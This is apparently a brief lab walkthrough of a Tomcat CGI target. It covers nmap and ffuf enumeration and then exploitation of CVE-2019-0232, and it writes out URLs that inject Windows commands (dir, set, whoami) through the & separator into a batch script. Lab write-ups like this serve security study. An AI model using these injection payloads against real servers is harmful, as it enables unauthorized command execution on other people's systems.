## Enumeration

```
nmap -p- -sC -Pn 10.129.204.227 --open
```

## Finding a CGI script

**Fuzzing Extensions - .CMD
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
```

**Fuzzing Extentions - .BAT
```
ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.bat
```
- Discovered URL: http://10.129.204.227:8080/cgi/welcome.bat


## Exploitation
```http
http://10.129.204.227:8080/cgi/welcome.bat?&dir
http://10.129.204.227:8080/cgi/welcome.bat?&set
http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
```
- Per CVE-2019-0232, we can append our own commands through the use of the batch command separator &.
